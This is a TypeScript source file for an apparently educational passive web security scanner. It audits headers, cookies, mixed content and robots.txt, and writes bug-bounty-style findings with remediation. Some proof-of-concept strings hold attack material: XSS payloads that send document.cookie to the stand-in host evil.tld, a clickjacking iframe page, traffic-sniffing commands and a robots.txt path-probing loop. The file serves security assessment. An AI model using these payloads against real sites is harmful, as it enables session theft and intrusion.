/**
 * BountyHawk passive reconnaissance engine.
 *
 * Everything in here is PASSIVE — it behaves exactly like a normal browser
 * visit (GET request, reading response headers/body, fetching robots.txt).
 * No injection, no fuzzing, no brute force, no active exploitation.
 * Findings include educational Proof-of-Concept write-ups and remediation,
 * just like a real bug-bounty report.
 */

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface FindingInput {
  slug: string;
  title: string;
  severity: Severity;
  category: string;
  description: string;
  impact: string;
  poc: string;
  remediation: string;
  points: number;
}

export interface ScanResult {
  url: string;
  host: string;
  finalUrl: string | null;
  status: "completed" | "failed";
  error?: string;
  statusCode?: number;
  grade?: string;
  score?: number;
  totalPoints?: number;
  findingsCount?: number;
  counts?: Record<Severity, number>;
  headers?: Record<string, string>;
  tech?: string[];
  findings: FindingInput[];
}

export const SEVERITY_ORDER: Severity[] = [
  "critical",
  "high",
  "medium",
  "low",
  "info",
];

export const POINTS: Record<Severity, number> = {
  critical: 500,
  high: 250,
  medium: 100,
  low: 40,
  info: 10,
};

const DEDUCTIONS: Record<Severity, number> = {
  critical: 35,
  high: 14,
  medium: 6,
  low: 2,
  info: 0,
};

export function gradeFor(score: number): string {
  if (score >= 92) return "A+";
  if (score >= 84) return "A";
  if (score >= 74) return "B";
  if (score >= 58) return "C";
  if (score >= 42) return "D";
  return "F";
}

/* ------------------------------------------------------------------ */
/* URL validation + SSRF guard                                         */
/* ------------------------------------------------------------------ */

function isPrivateHost(hostname: string): boolean {
  const h = hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (
    h === "localhost" ||
    h.endsWith(".localhost") ||
    h.endsWith(".local") ||
    h.endsWith(".internal") ||
    h === "::1" ||
    h === "0.0.0.0" ||
    h.startsWith("fc") ||
    h.startsWith("fd") ||
    h.startsWith("fe80")
  ) {
    return true;
  }
  if (/^(127\.|10\.|192\.168\.|169\.254\.|0\.)/.test(h)) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(h)) return true;
  return false;
}

export function normalizeTarget(input: string): string {
  const raw = input.trim();
  if (!raw) throw new Error("Please enter a target URL.");
  const withScheme = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`;
  let u: URL;
  try {
    u = new URL(withScheme);
  } catch {
    throw new Error("That doesn't look like a valid URL.");
  }
  if (!u.hostname.includes(".") && u.hostname !== "localhost") {
    throw new Error("Please enter a full domain, e.g. example.com");
  }
  if (!/^https?:$/.test(u.protocol)) {
    throw new Error("Only http(s) targets are supported.");
  }
  if (isPrivateHost(u.hostname)) {
    throw new Error(
      "Private / internal addresses are blocked. Scan public targets only."
    );
  }
  return `${u.protocol}//${u.host}${u.pathname === "/" ? "" : u.pathname}`;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

const UA =
  "BountyHawk/1.0 (passive security recon; educational bug-bounty scanner)";

function headersToRecord(h: Headers): Record<string, string> {
  const out: Record<string, string> = {};
  h.forEach((value, key) => {
    const k = key.toLowerCase();
    out[k] = out[k] ? `${out[k]}; ${value}` : value;
  });
  return out;
}

async function readBodyLimited(res: Response, max: number): Promise<string> {
  try {
    if (!res.body) return "";
    const reader = res.body.getReader();
    const decoder = new TextDecoder("utf-8", { fatal: false });
    let received = 0;
    let text = "";
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      received += value.byteLength;
      text += decoder.decode(value, { stream: true });
      if (received >= max) {
        reader.cancel().catch(() => {});
        break;
      }
    }
    return text;
  } catch {
    return "";
  }
}

function getCookies(h: Headers): string[] {
  const anyH = h as unknown as { getSetCookie?: () => string[] };
  if (typeof anyH.getSetCookie === "function") {
    try {
      return anyH.getSetCookie();
    } catch {
      /* fall through */
    }
  }
  const raw = h.get("set-cookie");
  if (!raw) return [];
  return raw.split(/,(?=[^;,]+=)/);
}

interface CookieInfo {
  name: string;
  attrs: string;
  secure: boolean;
  httponly: boolean;
  samesite: boolean;
}

function parseCookies(raw: string[]): CookieInfo[] {
  return raw.map((c) => {
    const [pair, ...rest] = c.split(";");
    const name = (pair ?? "").split("=")[0].trim() || "unnamed";
    const attrs = rest.join(";").toLowerCase();
    return {
      name,
      attrs,
      secure: /;\s*secure/i.test(`;${attrs}`),
      httponly: /httponly/.test(attrs),
      samesite: /samesite/.test(attrs),
    };
  });
}

const SESSION_COOKIE_RE =
  /(sess|token|auth|jwt|\bsid\b|jsessionid|asp.net_sessionid|laravel|csrf|login|user)/i;

/* ------------------------------------------------------------------ */
/* Main scan                                                           */
/* ------------------------------------------------------------------ */

export async function runScan(rawUrl: string): Promise<ScanResult> {
  const target = normalizeTarget(rawUrl);
  const u = new URL(target);
  const host = u.host;

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 15000);
    let res: Response;
    try {
      res = await fetch(target, {
        redirect: "follow",
        headers: { "User-Agent": UA, Accept: "text/html,*/*;q=0.8" },
        signal: controller.signal,
      });
    } finally {
      clearTimeout(timer);
    }

    const headers = headersToRecord(res.headers);
    const body = await readBodyLimited(res, 400_000);
    const finalUrl = res.url || target;
    const finalProto = (() => {
      try {
        return new URL(finalUrl).protocol;
      } catch {
        return u.protocol;
      }
    })();
    const https = finalProto === "https:";

    // Side probes in parallel: plaintext HTTP availability + robots.txt
    const [httpProbe, robotsText] = await Promise.all([
      probePlaintextHttp(u, target),
      fetchRobots(u.origin),
    ]);

    const findings: FindingInput[] = [];

    auditStatus(res, target, findings);
    auditTransport(u, https, httpProbe, findings);
    auditSecurityHeaders(headers, https, findings);
    auditCookies(parseCookies(getCookies(res.headers)), findings);
    auditMixedContent(body, https, findings);
    const tech = auditTechStack(headers, body, findings);
    auditRobots(host, robotsText, findings);

    // Score + grade
    const counts: Record<Severity, number> = {
      critical: 0,
      high: 0,
      medium: 0,
      low: 0,
      info: 0,
    };
    let totalPoints = 0;
    let deductions = 0;
    for (const f of findings) {
      counts[f.severity] += 1;
      totalPoints += f.points;
      deductions += DEDUCTIONS[f.severity];
    }
    const score = Math.max(0, Math.min(100, 100 - deductions));

    findings.sort(
      (a, b) =>
        SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity)
    );

    return {
      url: target,
      host,
      finalUrl,
      status: "completed",
      statusCode: res.status,
      grade: gradeFor(score),
      score,
      totalPoints,
      findingsCount: findings.length,
      counts,
      headers,
      tech,
      findings,
    };
  } catch (err) {
    const message =
      err instanceof Error && err.name === "AbortError"
        ? "The target took too long to respond (15s timeout)."
        : err instanceof Error
          ? err.message
          : "Unable to reach the target.";
    return {
      url: target,
      host,
      finalUrl: null,
      status: "failed",
      error: friendlyError(message),
      findings: [],
    };
  }
}

function friendlyError(msg: string): string {
  const m = msg.toLowerCase();
  if (m.includes("enotfound") || m.includes("getaddrinfo"))
    return "DNS lookup failed — the domain does not resolve.";
  if (m.includes("econnrefused"))
    return "Connection refused — nothing answered on that port.";
  if (m.includes("certificate") || m.includes("ssl") || m.includes("tls"))
    return "TLS certificate problem — the site's certificate is invalid or untrusted.";
  if (m.includes("timeout") || m.includes("abort"))
    return "The target took too long to respond (15s timeout).";
  if (m.includes("redirect"))
    return "Too many redirects — the target has a broken redirect loop.";
  if (msg.startsWith("Private"))
    return msg;
  return `Request failed: ${msg}`;
}

/* ------------------------------------------------------------------ */
/* Individual audits                                                   */
/* ------------------------------------------------------------------ */

function auditStatus(res: Response, target: string, out: FindingInput[]) {
  if (res.status >= 400) {
    out.push({
      slug: "http-error-status",
      title: `Target responded with HTTP ${res.status}`,
      severity: "info",
      category: "Reconnaissance",
      description: `The target returned an error status (${res.status}) for a plain GET request to ${target}. The site may block non-browser clients, bot protection may be active, or the endpoint may genuinely be missing.`,
      impact:
        "Limited direct impact, but error banners often leak framework names, stack traces and server paths — useful intel for further attacks.",
      poc: `curl -skI "${target}"\n# observe status line + Server header\n# retry with verbose errors: append ?debug=1, /error, /trace on apps you own`,
      remediation:
        "Serve generic error pages, disable stack traces in production, and ensure monitoring alerts on anomalous status codes.",
      points: POINTS.info,
    });
  }
}

interface HttpProbeResult {
  available: boolean;
  redirectsToHttps: boolean;
}

async function probePlaintextHttp(
  u: URL,
  _originalTarget: string
): Promise<HttpProbeResult> {
  if (u.protocol !== "https:") return { available: true, redirectsToHttps: false };
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 7000);
    const r = await fetch(`http://${u.host}/`, {
      redirect: "manual",
      headers: { "User-Agent": UA },
      signal: controller.signal,
    });
    clearTimeout(timer);
    const loc = r.headers.get("location") ?? "";
    return {
      available: true,
      redirectsToHttps:
        r.status >= 300 && r.status < 400 && /^https:/i.test(loc),
    };
  } catch {
    return { available: false, redirectsToHttps: false };
  }
}

function auditTransport(
  u: URL,
  https: boolean,
  probe: HttpProbeResult,
  out: FindingInput[]
) {
  if (!https) {
    out.push({
      slug: "no-https",
      title: "Site served over plain HTTP — no encryption",
      severity: "critical",
      category: "Transport Security",
      description: `The target at ${u.host} delivered its content over unencrypted HTTP. Every byte — including credentials, cookies and personal data — travels in cleartext and can be read or modified by any network intermediary.`,
      impact:
        "Trivial credential theft via passive sniffing, session hijacking, content injection and MITM malware delivery. Fails every compliance baseline (PCI-DSS, GDPR).",
      poc: `# Passive capture on the same network segment:\nsudo tcpdump -i wlan0 -A 'tcp port 80 and host ${u.host}'\n# Login forms and Cookie headers appear in cleartext.\n\n# Active MITM (lab only!):\n# bettercap / mitmproxy --mode transparent can rewrite responses.`,
      remediation:
        "Install a TLS certificate (Let's Encrypt is free), redirect all HTTP traffic to HTTPS with a 301, enable HSTS, and submit the domain to the HSTS preload list.",
      points: POINTS.critical,
    });
    return;
  }

  if (probe.available && !probe.redirectsToHttps) {
    out.push({
      slug: "http-not-disabled",
      title: "Unencrypted HTTP endpoint still live on port 80",
      severity: "medium",
      category: "Transport Security",
      description: `Although the canonical site uses HTTPS, http://${u.host}/ still answers requests without redirecting to the secure origin. First-time visitors typing the bare domain can silently land on an unencrypted copy.`,
      impact:
        "An attacker performing SSL-stripping can keep victims on HTTP forever. Cookies without the Secure flag leak on this endpoint.",
      poc: `curl -sk -o /dev/null -w "%{http_code}" "http://${u.host}/"\n# 2xx/4xx without Location: https://… means HTTP is serving content.\n# SSLstrip-style proxies then downgrade new visitors automatically.`,
      remediation:
        "Configure the web server to 301-redirect every port-80 request to HTTPS before serving anything, then enable HSTS with includeSubDomains and preload.",
      points: POINTS.medium,
    });
  }
}

function auditSecurityHeaders(
  h: Record<string, string>,
  https: boolean,
  out: FindingInput[]
) {
  const csp = h["content-security-policy"] ?? "";
  const xfo = h["x-frame-options"] ?? "";

  // HSTS
  if (https) {
    const hsts = h["strict-transport-security"];
    if (!hsts) {
      out.push({
        slug: "missing-hsts",
        title: "Missing Strict-Transport-Security (HSTS) header",
        severity: "medium",
        category: "Transport Security",
        description:
          "The site serves HTTPS but never sends an HSTS header, so browsers have no instruction to refuse plain-HTTP connections on future visits.",
        impact:
          "Users remain exposed to SSL-stripping MITM on their first visit and whenever they click an http:// link. Combined with any HTTP listener, session cookies can be stolen.",
        poc: `curl -skI "https://TARGET/" | grep -i strict-transport\n# empty output ⇒ no HSTS.\n# Exploitation pattern: attacker strips TLS on first request (sslstrip),\n# victim never upgrades because the browser was never told to.`,
        remediation:
          "Send `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` on every HTTPS response and submit to hstspreload.org.",
        points: POINTS.medium,
      });
    } else {
      const maxAge = /max-age\s*=\s*(\d+)/i.exec(hsts)?.[1];
      if (maxAge && Number(maxAge) < 15_552_000) {
        out.push({
          slug: "short-hsts",
          title: `Weak HSTS max-age (${maxAge}s)`,
          severity: "low",
          category: "Transport Security",
          description: `HSTS is present but max-age is only ${maxAge} seconds (~${Math.round(Number(maxAge) / 86400)} days). Short lifetimes leave long gaps where stripping attacks succeed.`,
          impact:
          "After the policy expires, the next http:// request is vulnerable to downgrade again.",
          poc: `curl -skI "https://TARGET/" | grep -i strict-transport\n# compare max-age against the recommended ≥ 63072000 (2 years)`,
          remediation: "Raise max-age to at least 63072000 and add includeSubDomains.",
          points: POINTS.low,
        });
      }
      if (!/includesubdomains/i.test(hsts)) {
        out.push({
          slug: "hsts-no-subdomains",
          title: "HSTS missing includeSubDomains",
          severity: "low",
          category: "Transport Security",
          description:
            "The HSTS policy protects only the apex domain. Subdomains (often weaker apps like staging., dev., admin.) stay downgradeable.",
          impact:
            "Attackers pivot to unprotected subdomains to strip TLS or mount cookie-related attacks against the parent domain.",
          poc: `curl -skI "https://staging.TARGET/" | grep -i strict-transport\n# a missing header on any subdomain confirms the gap`,
          remediation: "Add the includeSubDomains directive and audit all subdomains.",
          points: POINTS.low,
        });
      }
    }
  }

  // CSP
  if (!csp) {
    out.push({
      slug: "missing-csp",
      title: "No Content-Security-Policy deployed",
      severity: "medium",
      category: "Client-Side Hardening",
      description:
        "Without a CSP, the browser will execute any script that lands in the page — the single most effective XSS mitigation is absent.",
      impact:
        "Any stored/reflected XSS escalates to full account takeover: credential phishing overlays, keyloggers, forced actions and session-token exfiltration all become trivial.",
      poc: `# Reporter check:\ncurl -skI "https://TARGET/" | grep -i content-security\n# If an injection point exists, the payload runs with no restrictions:\n#   <img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">`,
      remediation:
        "Start with a report-only policy generated from real traffic, then enforce e.g. `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`.",
      points: POINTS.medium,
    });
  } else {
    if (/'unsafe-inline'/i.test(csp)) {
      out.push({
        slug: "csp-unsafe-inline",
        title: "CSP allows 'unsafe-inline' scripts",
        severity: "medium",
        category: "Client-Side Hardening",
        description:
          "The deployed CSP whitelists 'unsafe-inline', meaning inline <script> blocks and event handlers still execute. An injected snippet bypasses the policy completely.",
        impact:
          "XSS payloads embedded directly in HTML (the most common injection shape) ignore the policy entirely — CSP provides a false sense of security.",
        poc: `# Policy excerpt proving the hole:\ncurl -skI "https://TARGET/" | grep -io "script-src[^;]*"\n# PoC at any injection point:\n#   <svg/onload=alert(document.domain)>`,
        remediation:
          "Remove 'unsafe-inline', move logic to external hashed/nonced files, and use `script-src 'nonce-…'` or 'strict-dynamic'.",
        points: POINTS.medium,
      });
    }
    if (/'unsafe-eval'/i.test(csp)) {
      out.push({
        slug: "csp-unsafe-eval",
        title: "CSP allows 'unsafe-eval'",
        severity: "medium",
        category: "Client-Side Hardening",
        description:
          "'unsafe-eval' permits eval()/new Function(), letting attackers execute dynamically built strings — a classic CSP escape hatch.",
        impact:
          "Chained with even a tiny JSON-injection sink, eval turns benign-looking data into arbitrary code execution inside the browser.",
        poc: `curl -skI "https://TARGET/" | grep -io "script-src[^;]*"\n# With unsafe-eval, gadgets like _.template / Angular expressions\n# evaluate attacker-controlled strings client-side.`,
        remediation:
          "Audit for libraries requiring eval (older template engines), upgrade them, then drop 'unsafe-eval' from the policy.",
        points: POINTS.medium,
      });
    }
  }

  // Clickjacking
  if (!xfo && !/frame-ancestors/i.test(csp)) {
    out.push({
      slug: "clickjacking",
      title: "Clickjacking — page can be framed anywhere",
      severity: "medium",
      category: "Client-Side Hardening",
      description:
        "Neither X-Frame-Options nor CSP frame-ancestors is set, so any attacker page may embed the target in a transparent iframe and intercept clicks.",
      impact:
        "Victims unknowingly press real buttons — transfer funds, change password/email, grant OAuth scopes — while believing they clicked an innocent overlay.",
      poc: `<!-- PoC page hosted anywhere -->\n<style>iframe{opacity:.0001;position:absolute;top:0;left:0;height:100%;width:100%}</style>\n<button onclick="alert('clicked')">CLAIM FREE REWARD</button>\n<iframe src="https://TARGET/account/settings"></iframe>\n<!-- user thinks they clicked the button; actually hit TARGET's UI -->`,
      remediation:
        "Send `X-Frame-Options: DENY` today and deploy `Content-Security-Policy: frame-ancestors 'none'` as the long-term fix.",
      points: POINTS.medium,
    });
  }

  // MIME sniffing
  if ((h["x-content-type-options"] ?? "") !== "nosniff") {
    out.push({
      slug: "mime-sniffing",
      title: "Missing X-Content-Type-Options: nosniff",
      severity: "low",
      category: "Client-Side Hardening",
      description:
        "Without nosniff, legacy browsers re-interpret responses and may execute uploaded images/CSS as JavaScript — enabling drive-by attacks via user uploads.",
      impact:
        "An attacker who can upload a file with misleading bytes achieves script execution in the context of the target origin.",
      poc: `curl -skI "https://TARGET/upload/avatar.png" | grep -i x-content-type\n# Upload a PNG whose bytes start with a JS payload; IE-era sniffing executes it.`,
      remediation: "Return `X-Content-Type-Options: nosniff` on every response.",
      points: POINTS.low,
    });
  }

  // Referrer-Policy
  if (!h["referrer-policy"]) {
    out.push({
      slug: "no-referrer-policy",
      title: "No Referrer-Policy header",
      severity: "info",
      category: "Privacy Hardening",
      description:
        "Full URLs — sometimes containing tokens in query strings (?reset=abc123) — leak to third-party sites via the Referer header.",
      impact:
        "Password-reset links, CSRF tokens and internal paths end up in third-party analytics logs and ad networks.",
      poc: `# On your own lab page linked from TARGET, log incoming referers:\nphp -S 0.0.0.0:8000   # watch access log after clicking a link from TARGET`,
      remediation:
        "Deploy `Referrer-Policy: strict-origin-when-cross-origin` (or no-referrer for sensitive apps).",
      points: POINTS.info,
    });
  }

  // Permissions-Policy
  if (!h["permissions-policy"] && !h["feature-policy"]) {
    out.push({
      slug: "no-permissions-policy",
      title: "No Permissions-Policy header",
      severity: "info",
      category: "Privacy Hardening",
      description:
        "Camera, microphone, geolocation and payment APIs are left unrestricted; a compromised iframe or dependency could silently activate sensors.",
      impact:
        "Malicious third-party scripts gain sensor access the page itself never needed.",
      poc: `curl -skI "https://TARGET/" | grep -i permissions-policy\n# absence ⇒ navigator.geolocation usable by any script on the page`,
      remediation:
        "Ship a restrictive policy, e.g. `Permissions-Policy: camera=(), microphone=(), geolocation=(self), interest-cohort=()`.",
      points: POINTS.info,
    });
  }

  // Cross-Origin isolation family
  if (!h["cross-origin-opener-policy"] && !h["cross-origin-resource-policy"]) {
    out.push({
      slug: "no-coop-corp",
      title: "Cross-Origin window-isolation headers absent",
      severity: "info",
      category: "Privacy Hardening",
      description:
        "COOP/CORP/COEP are not set, leaving the window reachable cross-origin — weakening defenses against Spectre-class leaks and cross-window attacks.",
      impact:
        "Advanced side-channel attacks can read cross-origin memory when windows share a browsing-context group.",
      poc: `curl -skI "https://TARGET/" | grep -Ei "cross-origin-(opener|resource|embedder)"\n# empty ⇒ window.opener chaining from opened tabs remains possible`,
      remediation:
        "Adopt `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-origin` where cross-origin embedding isn't required.",
      points: POINTS.info,
    });
  }
}

function auditCookies(cookies: CookieInfo[], out: FindingInput[]) {
  if (cookies.length === 0) return;

  const insecure = cookies.filter((c) => !c.secure);
  if (insecure.length > 0) {
    const names = insecure.map((c) => c.name).join(", ");
    out.push({
      slug: "cookie-missing-secure",
      title: `Cookies without the Secure flag (${names})`,
      severity: "medium",
      category: "Session Management",
      description: `The following cookies are issued without the Secure attribute: ${names}. Browsers will happily transmit them over any plain-HTTP request.`,
      impact:
        "One stray http:// request (image tag, typo, SSL-strip) exfiltrates the whole session to a passive sniffer.",
      poc: `curl -skI "https://TARGET/" | grep -i set-cookie\n# note absence of "; Secure"\n# then: curl -sI "http://TARGET/img.png"  → Cookie header follows in cleartext`,
      remediation:
        "Set `Secure` on every cookie at the framework level and enforce HSTS as defense-in-depth.",
      points: POINTS.medium,
    });
  }

  const sessionNoHttpOnly = cookies.filter(
    (c) => !c.httponly && SESSION_COOKIE_RE.test(c.name)
  );
  if (sessionNoHttpOnly.length > 0) {
    const names = sessionNoHttpOnly.map((c) => c.name).join(", ");
    out.push({
      slug: "session-cookie-no-httponly",
      title: `Session cookies readable by JavaScript (${names})`,
      severity: "medium",
      category: "Session Management",
      description: `Likely session/auth cookies (${names}) lack HttpOnly. Any XSS — even a one-shot reflected blip — can read them via document.cookie.`,
      impact:
        "XSS instantly converts to persistent account takeover: the token is smuggled out and replayed from the attacker's machine.",
      poc: `# Confirm readability:\ncurl -skI "https://TARGET/login" | grep -i set-cookie | grep -vi httponly\n# Post-XSS exfiltration:\n#   <img src=x onerror="fetch('https://evil.tld/?c='+encodeURIComponent(document.cookie))">`,
      remediation:
        "Add `HttpOnly` (and `SameSite=Lax`) to all auth cookies; rotate secrets server-side on incident.",
      points: POINTS.medium,
    });
  }

  const noSameSite = cookies.filter((c) => !c.samesite);
  if (noSameSite.length > 0) {
    out.push({
      slug: "cookies-no-samesite",
      title: "Cookies missing SameSite attribute",
      severity: "low",
      category: "Session Management",
      description: `${noSameSite.length} cookie(s) omit SameSite. Old browsers default to None, keeping them attached to cross-site forged requests.`,
      impact:
        "Increases CSRF feasibility on legacy browsers and enables some login-CSRF and tracking flows.",
      poc: `curl -skI "https://TARGET/" | grep -i set-cookie\n# no "SameSite=" ⇒ defaults vary by browser vintage (None pre-2020)`,
      remediation: "Explicitly set `SameSite=Lax` (or Strict) on every cookie.",
      points: POINTS.low,
    });
  }
}

function auditMixedContent(body: string, https: boolean, out: FindingInput[]) {
  if (!https || !body) return;
  const matches = body.match(/(?:src|href)\s*=\s*["']http:\/\/[^"'>\s]+["']/gi);
  const count = matches?.length ?? 0;
  if (count > 0) {
    const samples = [...new Set(matches!.map((m) => m.slice(m.indexOf("http"), -1)))].slice(0, 6);
    out.push({
      slug: "mixed-content",
      title: `Mixed content — ${count} insecure resource reference(s)`,
      severity: "medium",
      category: "Transport Security",
      description: `The HTTPS page references ${count} http:// resource(s), e.g. ${samples.join(" | ")}. Browsers warn users and network attackers control those assets.`,
      impact:
        "A MITM swaps the cleartext script/image for malware while the padlock icon stays green — a trusted-context compromise.",
      poc: `# enumerate:\ncurl -sk "https://TARGET/" | grep -Eio '(src|href)="http://[^"]+"'\n# interception is trivial on hostile WiFi; no cert forgery needed.`,
      remediation:
        "Upgrade every asset URL to https:// (or protocol-relative //), enable `Content-Security-Policy: upgrade-insecure-requests`, and gate via automated linting.",
      points: POINTS.medium,
    });
  }
}

/* Tech-stack fingerprinting ---------------------------------------- */

function auditTechStack(
  h: Record<string, string>,
  body: string,
  out: FindingInput[]
): string[] {
  const tech = new Set<string>();
  const versions: string[] = [];

  const server = h["server"] ?? "";
  const powered = h["x-powered-by"] ?? "";
  const aspnet = h["x-aspnet-version"] ?? h["x-aspnetmvc-version"] ?? "";

  const srvMatch =
    /^(nginx|apache|microsoft-iis|litespeed|openresty|tengine|gws|caddy|envoy)[\/\s]?([\d.]+)?/i.exec(
      server
    );
  if (srvMatch) {
    tech.add(srvMatch[1].replace(/microsoft-/i, ""));
    if (srvMatch[2]) versions.push(`${srvMatch[1]} ${srvMatch[2]}`);
  }
  if (powered) {
    tech.add(powered.split(",")[0].trim());
    if (/\d/.test(powered)) versions.push(powered);
  }
  if (aspnet) versions.push(`ASP.NET ${aspnet}`);

  if (h["cf-ray"] || /cloudflare/i.test(server)) tech.add("Cloudflare");
  if (h["x-vercel-id"]) tech.add("Vercel");
  if (h["x-nf-request-id"]) tech.add("Netlify");
  if (h["x-github-request-id"]) tech.add("GitHub Pages");
  if (h["x-amz-request-id"] || h["x-amz-cf-id"]) tech.add("AWS CloudFront");
  if (h["x-generator"]) {
    tech.add(h["x-generator"].split(" ")[0]);
    if (/\d/.test(h["x-generator"])) versions.push(h["x-generator"]);
  }
  if (h["x-drupal-cache"] !== undefined) tech.add("Drupal");
  if (h["x-shopify-stage"]) tech.add("Shopify");

  if (body) {
    const genMeta =
      /<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i.exec(body);
    if (genMeta) {
      const product = genMeta[1].split(" ")[0];
      tech.add(product);
      if (/\d/.test(genMeta[1])) versions.push(genMeta[1]);
    }
    if (/wp-content\//i.test(body)) tech.add("WordPress");
    if (/cdn\.shopify\.com/i.test(body)) tech.add("Shopify");
    if (/__next\/static/i.test(body)) tech.add("Next.js");
    if (/__nuxt/i.test(body)) tech.add("Nuxt.js");
    if (/react(-dom)?[\.-][\d.]+(\.min)?\.js|unpkg\.com\/react@/i.test(body))
      tech.add("React");
    const jq = /jquery[.-]([\d.]+)(\.min)?\.js/i.exec(body);
    if (jq) {
      tech.add("jQuery");
      versions.push(`jQuery ${jq[1]}`);
    } else if (/jquery(\.min)?\.js/i.test(body)) tech.add("jQuery");
    if (/bootstrap(\.bundle)?(\.min)?\.(css|js)|jsdelivr\.net\/npm\/bootstrap@/i.test(body))
      tech.add("Bootstrap");
    if (/cdn\.tailwindcss\.com|tailwind/i.test(body)) tech.add("Tailwind CSS");
    if (/vue(@|-)[\d.]+|global Vue\./i.test(body)) tech.add("Vue.js");
  }

  if (versions.length > 0) {
    const list = [...new Set(versions)].slice(0, 10);
    out.push({
      slug: "version-disclosure",
      title: `Software versions disclosed in responses (${list.join(", ")})`,
      severity: "low",
      category: "Information Disclosure",
      description: `Response fingerprints reveal exact software versions: ${list.join(", ")}. Attackers skip scanning entirely and go straight to the CVE feed for those releases.`,
      impact:
        "Dramatically shortens time-to-exploit — known CVEs map 1:1 to the disclosed stack, enabling targeted exploit selection.",
      poc: `curl -skI "https://TARGET/" | egrep -i 'server|x-powered-by|x-aspnet|x-generator'\n# then: searchsploit $(fingerprint)  /  cvedetails.com version lookup`,
      remediation:
        "Strip version headers (`server_tokens off;`, `expose_php = Off`, RemoveServerHeader middleware), patch aggressively, and hide CDN edge hints where feasible.",
      points: POINTS.low,
    });
  }

  return [...tech].slice(0, 16);
}

/* robots.txt --------------------------------------------------------- */

async function fetchRobots(origin: string): Promise<string | null> {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 6000);
    const r = await fetch(`${origin}/robots.txt`, {
      headers: { "User-Agent": UA },
      signal: controller.signal,
    });
    clearTimeout(timer);
    if (!r.ok) return null;
    const t = await r.text();
    return t.length > 50_000 ? t.slice(0, 50_000) : t;
  } catch {
    return null;
  }
}

function auditRobots(
  host: string,
  robots: string | null,
  out: FindingInput[]
) {
  if (!robots) return;
  const disallowed: string[] = [];
  for (const line of robots.split(/\r?\n/)) {
    const m = /^\s*Disallow:\s*(\S+)/i.exec(line);
    if (m && m[1] !== "/") disallowed.push(m[1]);
  }
  const interesting = [
    ...new Set(
      disallowed.filter((p) =>
        /(admin|backup|\.git|\.env|\.sql|config|phpmyadmin|wp-login|wp-admin|uploads|private|secret|\bold\b|test|dev|internal|api\/|debug|staging)/i.test(
          p
        )
      )
    ),
  ].slice(0, 12);

  if (interesting.length > 0) {
    out.push({
      slug: "robots-sensitive-paths",
      title: "Sensitive paths advertised in robots.txt",
      severity: "info",
      category: "Information Disclosure",
      description: `robots.txt on ${host} effectively publishes a treasure map: ${interesting.join(", ")}. Disallow entries are publicly indexed and scream "look here".`,
      impact:
        "Hidden admin panels, backups and tooling get discovered in seconds; Google has likely already crawled several despite the directive.",
      poc: `curl -sk "https://${host}/robots.txt"\n# harvest every Disallow path, then probe each:\nfor p in $(grep -ioP 'Disallow:\\s*\\K.*' robots.txt); do curl -sko /dev/null -w "$p %{http_code}\\n" "https://${host}$p"; done`,
      remediation:
        "Protect sensitive areas with authentication/network controls instead of secrecy, and remove revealing Disallow lines where auth is enforced.",
      points: POINTS.info,
    });
  }
}
